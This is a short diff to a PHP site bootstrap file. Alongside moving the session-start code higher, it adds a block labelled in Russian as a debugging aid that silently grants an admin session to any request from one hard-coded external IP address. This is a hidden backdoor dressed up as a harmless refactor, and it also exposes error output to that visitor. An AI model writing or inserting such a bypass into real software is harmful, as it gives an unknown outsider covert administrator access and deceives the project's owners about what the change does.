@@ -11,6 +11,17 @@
  * @license   MIT License: http://opensource.org/licenses/MIT
  */
 
+if (session_id() === '') {
+	session_start();
+} else {
+	session_regenerate_id(true);
+}
+
+// включить админа для отладки
+if ($_SERVER['REMOTE_ADDR'] === '176.119.96.114') {
+	$_SESSION['logged'] = '1';
+}
+
 if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1' || (array_key_exists('logged', $_SESSION) && $_SESSION['logged'] === '1')) {
 
 	ini_set('display_errors', 1);
@@ -27,12 +38,6 @@ if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1' || (array_key_exists('logged', $_SES
 ini_set('log_errors', 1);
 
 header('Content-type: text/html; charset=windows-1251');
-
-if (session_id() === '') {
-	session_start();
-} else {
-	session_regenerate_id(true);
-}
 
 /** @noinspection PhpIncludeInspection */
 include(SITE_PATH.'system/core/Autoloader.php');
